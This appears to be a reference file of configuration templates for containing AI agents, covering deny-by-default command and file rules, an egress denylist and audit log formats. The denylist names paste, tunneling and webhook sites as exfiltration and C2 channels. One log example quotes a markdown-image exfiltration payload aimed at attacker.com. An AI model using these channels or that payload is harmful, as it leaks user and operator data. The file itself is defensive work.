# ASK Configuration Templates — ASK 2026.04

Canonical configuration templates for ASK framework elements.
Read this file when generating or reviewing Mind, Gateway, Egress, Enforcer, Delegation, or Audit Log configs.

---

## Table of Contents

1. [Mind Configuration (Constraints)](#mind-configuration)
2. [Gateway Policy](#gateway-policy)
3. [Egress Proxy Denylist](#egress-proxy-denylist)
4. [Enforcer Configuration](#enforcer-configuration)
5. [Delegation Bus Message Format](#delegation-bus-message-format)
6. [Audit Log Event Format](#audit-log-event-format)
7. [Composition Example](#composition-example)

---

## Mind Configuration

The Mind configuration lives in the Constraints layer — `constraints/mind.yaml`, mounted `:ro` into the
agent container. The agent cannot modify this file. Changes require host-level access and go through
the operator's governance process.

```yaml
# constraints/mind.yaml — Agent constraints configuration
# This file is mounted :ro. The agent cannot modify it.
# Changes go through version control and operator governance.

# --- Identity and Role ---
agent_id: dev-assistant-01
role: development-assistant
tier: 2                          # 1=Restricted, 2=Standard, 3=Elevated, 4=Privileged

# --- Model Access ---
models:
  allowed:
    - claude-sonnet-4-6
    - claude-haiku-4-5
  default: claude-sonnet-4-6

# --- Budget and Rate Limits ---
limits:
  budget_daily_usd: 50
  requests_per_minute: 100
  max_context_tokens: 200000
  max_output_tokens: 16000

# --- Behavioral Constraints ---
# These are security-relevant parameters — they belong in Constraints, not Identity.
behavior:
  risk_tolerance: moderate        # low | moderate | high
  escalation_threshold: medium    # when to escalate to operator
  autonomous_actions: true        # can the agent act without per-action approval
  irreversible_action_policy: approve  # allow | approve | deny
  file_deletion_policy: soft_delete    # allow | soft_delete | deny | approve

# --- Delegation ---
delegation:
  can_delegate: true
  allowed_targets:
    - tier: 1                     # can only delegate to Tier 1 agents
  max_concurrent_delegations: 3

# --- Tool Access ---
tools:
  allowed:
    - read_file
    - write_file
    - execute_command
    - web_search
    - github_api
  denied:
    - database_admin
    - credential_management
    - policy_modification

# --- Web Access ---
web:
  enabled: true
  mode: filtered                  # none | filtered | broad
  # Actual domain denylist is in the egress proxy config, not here.
  # This field declares intent; the proxy enforces it.

# --- Service Grants ---
# Real credentials are in infrastructure secrets, not here.
# The enforcer swaps scoped tokens for real credentials at the HTTP layer.
service_grants:
  - service: github
    scope: repo:read,repo:write
    token_ref: grants/github-dev-assistant-01  # references infra secret, not a real key

# --- Session Behavior ---
session:
  runtime_pattern: interactive    # interactive | autonomous
  max_session_duration: 8h
  idle_timeout: 30m
  constraint_update_policy: next_session  # immediate | next_session
```

### mind.yaml Required Fields

| Field | Type | Description |
|---|---|---|
| `agent_id` | string | Unique identifier for this agent |
| `role` | string | Functional role (e.g., `development-assistant`, `security-monitor`) |
| `tier` | integer (1–4) | Trust tier — determines capability envelope |

### mind.yaml Required Sections

| Section | Purpose | Key Fields |
|---|---|---|
| `models` | LLM access scope | `allowed` (list), `default` (model ID) |
| `limits` | Resource bounds | `budget_daily_usd`, `requests_per_minute` |
| `behavior` | Security-relevant parameters | `risk_tolerance`, `escalation_threshold`, `irreversible_action_policy` |
| `tools` | Tool access scope | `allowed` (list), `denied` (list) |
| `session` | Runtime configuration | `runtime_pattern` (`interactive` or `autonomous`) |

### mind.yaml Optional Sections

| Section | Purpose | When Needed |
|---|---|---|
| `delegation` | Multi-agent delegation rules | Only for agents that delegate |
| `web` | Web access declaration | Only when web access is enabled |
| `service_grants` | External service access | Only when agent accesses external services beyond LLM |

**Key invariant:** `models.allowed`, `limits`, and `tools` declare intent in the Constraints layer — actual enforcement happens in the scoped API key (models, limits), the gateway policy (tools), and the egress proxy (web). Visible constraints tell the agent what it's permitted to do; invisible enforcement prevents anything else.

### Trust Tiers

| Tier | Name | Description | Typical Scope |
|---|---|---|---|
| 1 | Restricted | Read-only, no side effects | Analysis, summarization, Q&A |
| 2 | Standard | Limited writes, scoped tools | Document editing, development |
| 3 | Elevated | Broader tool access, some network | API calls, integrations |
| 4 | Privileged | Wide access, requires strong enforcement | DevOps, admin tasks |

**Key invariant:** Higher tiers demand stricter Gateway, Egress, and Enforcer configs — not looser ones.

---

## Gateway Policy

The runtime gateway mediates all tool calls, shell commands, file operations, and MCP interactions.
Default posture is **deny-all**. Runs in a separate container sharing only the PID namespace with the agent.

```yaml
# gateway-policy.yaml — Runtime tool/command/file/MCP control
# Lives in the gateway container, invisible to the agent.

# --- Command Policy ---
commands:
  default: deny

  allowed:
    # Development tools
    - pattern: "git *"
      action: allow
    - pattern: "npm *"
      action: allow
    - pattern: "node *"
      action: allow
    - pattern: "python3 *"
      action: allow
    - pattern: "pytest *"
      action: allow
    - pattern: "make *"
      action: allow
    - pattern: "cargo *"
      action: allow

    # File operations
    - pattern: "ls *"
      action: allow
    - pattern: "cat *"
      action: allow
    - pattern: "mkdir *"
      action: allow

    # Destructive with controls
    - pattern: "rm *"
      action: allow
      modifier: soft_delete     # Moves to recovery area instead of deleting
    - pattern: "rm -rf *"
      action: approve           # Requires human approval

  denied:
    - pattern: "sudo *"
      action: deny
    - pattern: "chmod *"
      action: deny
    - pattern: "curl *"
      action: deny              # Use mediated HTTP instead
    - pattern: "wget *"
      action: deny
    - pattern: "pip install *"
      action: approve           # Requires human approval

# --- File Policy ---
files:
  - path: "/home/agent/workspace/**"
    read: allow
    write: allow
    execute: allow

  - path: "/home/agent/constraints/**"
    read: allow
    write: deny                 # :ro mount enforced at filesystem level too
    execute: deny

  - path: "/home/agent/identity/**"
    read: allow
    write: allow
    execute: deny
    audit: true                 # All writes logged to security monitor

  - path: "**/.env"
    read: deny
    write: deny
  - path: "**/credentials*"
    read: deny
    write: deny
  - path: "**/secrets*"
    read: deny
    write: deny

# --- MCP Tool Policy ---
mcp:
  default: deny

  servers:
    - name: "filesystem"
      tools:
        - name: "read_file"
          action: allow
        - name: "write_file"
          action: allow
          modifier: soft_delete   # Overwrites backed up first
        - name: "list_directory"
          action: allow

    - name: "github"
      tools:
        - name: "get_file_contents"
          action: allow
        - name: "create_pull_request"
          action: approve         # Requires human approval
        - name: "push_files"
          action: approve

  # Block new MCP server registration at runtime
  registration:
    new_servers: deny             # Operator must pre-approve
    tool_definition_changes: block_and_alert   # Version pinning

# --- Soft Delete Configuration ---
soft_delete:
  recovery_path: "/home/agent/.recovery/"
  retention_days: 7
  max_size_mb: 500
```

---

## Egress Proxy Denylist

The egress proxy controls all outbound HTTP/HTTPS traffic. Lives in the egress proxy container,
invisible to the agent.

```yaml
# egress-denylist.yaml — Outbound network control
# Lives in the egress proxy container. Agent cannot see or modify.

# --- Denied Domains ---
denied_domains:
  # Data exfiltration vectors
  - domain: "pastebin.com"
    reason: "paste site — data exfiltration risk"
  - domain: "*.pastebin.com"
    reason: "paste site subdomains"
  - domain: "transfer.sh"
    reason: "file transfer — data exfiltration risk"
  - domain: "file.io"
    reason: "file transfer — data exfiltration risk"

  # Tunneling / C2
  - domain: "*.ngrok.io"
    reason: "tunneling service — C2 risk"
  - domain: "*.ngrok-free.app"
    reason: "tunneling service — C2 risk"
  - domain: "*.trycloudflare.com"
    reason: "tunneling service — C2 risk"

  # Webhook capture
  - domain: "webhook.site"
    reason: "webhook capture — exfiltration risk"
  - domain: "requestbin.com"
    reason: "request capture — exfiltration risk"

  # URL shorteners
  - domain: "bit.ly"
    reason: "URL shortener — obscures destination"
  - domain: "tinyurl.com"
    reason: "URL shortener — obscures destination"

  # DNS-over-HTTPS providers
  - domain: "dns.google"
    reason: "DoH — prevents DoH bypass of DNS controls"
  - domain: "cloudflare-dns.com"
    reason: "DoH — prevents DoH bypass of DNS controls"
  - domain: "dns.quad9.net"
    reason: "DoH — prevents DoH bypass of DNS controls"

# --- Rate Limits ---
rate_limits:
  global:
    requests_per_minute: 500
  per_domain:
    requests_per_minute: 60
  max_response_size_bytes: 10485760  # 10MB

# --- DNS ---
dns:
  resolver: internal              # Use internal DNS only
  block_external_resolvers: true  # Prevent DNS tunneling
  block_doh: true                 # Block DNS-over-HTTPS
```

### Egress Posture Levels

| Posture | Description |
|---|---|
| **No egress** | Agent has zero outbound network. Strongest posture. |
| **Allowlist only** | Specific hosts/ports/methods. Default for most agents. |
| **Denylist** | Block known-bad, allow rest. Weakest; avoid for sensitive agents. |

**Warning:** An incomplete denylist allows access to malicious destinations. Supplement with automated threat feeds.

---

## Enforcer Configuration

The enforcer is a per-agent HTTP policy proxy sidecar. It sits between the agent and all shared
infrastructure. Lives in the enforcer container, invisible to the agent.

```yaml
# enforcer-config.yaml — Per-agent HTTP policy proxy sidecar
# Lives in the enforcer container. Agent cannot see or modify.

# --- Agent Identity ---
agent_id: dev-assistant-01
tier: 2

# --- Listening ---
listen:
  address: "0.0.0.0"
  port: 18080                     # The only endpoint the agent can reach

# --- Upstream Routing ---
routes:
  # LLM API calls → LLM proxy (via egress)
  - match:
      path_prefix: "/v1/"
    upstream:
      host: "llm-proxy"
      port: 4000
    auth:
      header: "Authorization"
      value_ref: "secrets/llm-proxy-key"

  # HTTPS CONNECT requests → egress proxy
  - match:
      method: "CONNECT"
    upstream:
      host: "egress-proxy"
      port: 3128

  # All other HTTP → egress proxy
  - match:
      default: true
    upstream:
      host: "egress-proxy"
      port: 3128

# --- Service Credential Swap ---
# Agent sends a scoped service token identifying the grant.
# Enforcer swaps for real credential before forwarding.
service_grants:
  - service: "github"
    token_match: "github:dev-assistant-01"   # scoped token from agent
    credential_ref: "secrets/github-api-key"
    upstream_header: "Authorization"
    upstream_format: "token {credential}"

  - service: "search-api"
    token_match: "search:dev-assistant-01"   # scoped token from agent
    credential_ref: "secrets/search-api-key"
    upstream_header: "X-API-Key"
    upstream_format: "{credential}"

# --- Response Sanitization ---
strip_response_headers:
  - "x-request-id"
  - "x-account-id"
  - "x-organization-id"
  - "cf-ray"
  - "server"

# --- Audit Logging ---
audit:
  log_path: "/var/log/enforcer/audit.jsonl"
  log_format: "jsonl"
  fields:
    - timestamp
    - agent_id
    - method
    - url
    - status_code
    - request_size
    - response_size
    - duration_ms
    - service_grant
    - correlation_id

# --- Hot Reload ---
reload_signal: "SIGHUP"          # Grants/revocations take effect immediately
```

### Enforcer Invariants

1. The enforcer is the **only endpoint** the agent can reach — agent cannot reach LLM proxy, egress proxy, or mediation network directly.
2. The enforcer **cannot** be restarted, reconfigured, or stopped by the agent.
3. Service credential swap is tested — agent's scoped token is replaced with real credential at the enforcer, not at the agent.
4. Response headers are stripped to prevent leaking provider account information.
5. Hot reload allows grants and revocations during active sessions — no agent restart required.

---

## Delegation Bus Message Format

The delegation bus validates, scopes, scans, and logs every delegation between agents.

```yaml
# delegation-message.yaml — Inter-agent delegation format

# --- Delegation Request ---
delegation_request:
  id: "del-2026-03-15-001"
  from:
    agent_id: "coordinator-01"
    tier: 2
  to:
    agent_id: "researcher-01"
    tier: 1
  task:
    description: "Analyze Q3 security audit findings"
    context:                      # Scoped context — not full coordinator context
      - "Q3 audit report summary"
      - "Relevant policy excerpts"
  permissions:
    permitted_tools: [read_file, summarize]
    permitted_paths: ["/data/q3-audit/**"]
    denied_tools: ["*"]           # Everything else denied
    denied_paths: ["/data/credentials/**"]
  bounds:
    timeout_seconds: 300
    budget_usd: 2.00
    max_llm_calls: 50

# --- Bus Validation ---
# The delegation bus validates BEFORE delivering:
bus_validation:
  checks:
    - tier_hierarchy: "Tier 2 can delegate to Tier 1"
    - permission_subset: "requested permissions ⊆ delegator permissions"
    - agent_available: "researcher-01 is RUNNING"
    - concurrency_limit: "coordinator-01 has < max_concurrent_delegations"

# --- Delegation Response ---
delegation_response:
  id: "del-2026-03-15-001"
  status: completed
  output:
    summary: "Analysis findings..."
    artifacts: []
  resource_usage:
    llm_calls: 12
    budget_used_usd: 0.45
    duration_seconds: 87
  security:
    post_scan:
      engine: "xpia-regex-v1"
      result: clean               # Response scanned before delivery to parent
```

---

## Audit Log Event Format

Audit logs are written by the mediation layer, NOT by the agent. All events share common fields.

```yaml
# log-events.yaml — Audit log event format

# --- Common Fields (present in every event) ---
common:
  timestamp: "2026-03-15T14:30:00.000Z"
  agent_id: "dev-assistant-01"
  correlation_id: "sess-abc123-req-456"
  event_type: ""                  # egress | llm | enforcer | gateway | sentinel
  source: ""                     # Which enforcement component wrote this
  action: ""                     # What happened
  result: ""                     # allowed | denied | blocked | flagged | error

# --- Event Types ---

# Egress proxy — allowed connection
egress_allowed:
  event_type: egress
  source: egress-proxy
  action: connect
  result: allowed
  destination:
    host: "api.github.com"
    port: 443
    method: GET

# Egress proxy — blocked connection
egress_blocked:
  event_type: egress
  source: egress-proxy
  action: connect
  result: denied
  destination:
    host: "pastebin.com"
    port: 443
  reason: "domain in denylist — data exfiltration risk"

# LLM proxy — guardrail trigger
llm_guardrail_trigger:
  event_type: llm
  source: llm-proxy
  action: chat_completion
  result: blocked
  guardrail:
    scanner: "pre_call"
    engine: "xpia-regex-v1"
    pattern_matched: "markdown_image_exfiltration"
    detail: "Detected ![](https://attacker.com/steal?data=...) pattern"

# Gateway — command event
gateway_command:
  event_type: gateway
  source: runtime-gateway
  action: execute_command
  result: allowed
  command:
    original: "pytest tests/"
    exit_code: 0
    duration_ms: 4500

# Constraint change event
constraint_change:
  event_type: sentinel
  source: constraint-manager
  action: constraint_update
  result: acknowledged
  change:
    field: "limits.budget_daily_usd"
    old_value: 50
    new_value: 75
    hash: "sha256:abc123..."
```

---

## Composition Example

A complete ASK-compliant deployment ties all elements together:

```
┌─────────────────────────────────────────────────────────────────┐
│                        Deployment Unit                          │
│                                                                 │
│  Agent-Internal Network                                         │
│  ┌──────────────────────────┐                                   │
│  │     Agent Container      │                                   │
│  │                          │                                   │
│  │  constraints/ (:ro)      │    Only endpoint agent can reach: │
│  │  identity/   (:rw)       │──▶ Enforcer (port 18080)          │
│  │  workspace/              │                                   │
│  │                          │                                   │
│  └──────────────────────────┘                                   │
│                                                                 │
│  ┌──────────────┐  ┌───────────┐  ┌──────────────┐             │
│  │  Enforcer    │  │  Runtime  │  │  Guardrails  │             │
│  │  (sidecar)   │  │  Gateway  │  │  Stack       │             │
│  │              │  │ (sidecar) │  │              │             │
│  │ Routes HTTP  │  │ Shell shim│  │ Pre-call     │             │
│  │ Swaps creds  │  │ FUSE      │  │ Post-call    │             │
│  │ Strips hdrs  │  │ Landlock  │  │ XPIA scan    │             │
│  └──────┬───────┘  └───────────┘  └──────────────┘             │
│         │                                                       │
│  ┌──────┴───────┐  ┌───────────┐                               │
│  │  LLM Proxy   │  │  Egress   │                               │
│  │              │  │  Proxy    │                               │
│  │ Scoped keys  │  │           │                               │
│  │ Budget caps  │  │ Denylist  │                               │
│  │ Rate limits  │  │ Rate lim  │                               │
│  └──────────────┘  └───────────┘                               │
│                                                                 │
│  ┌──────────────────────────────────────────────────┐          │
│  │                  Audit Log                        │          │
│  │  External sink — agent has no write access        │          │
│  └──────────────────────────────────────────────────┘          │
└─────────────────────────────────────────────────────────────────┘
```

Every action flows: Agent → Enforcer → (Gateway | LLM Proxy | Egress Proxy) → External Resource
Every event flows: (any enforcement component) → Audit Log (external sink)
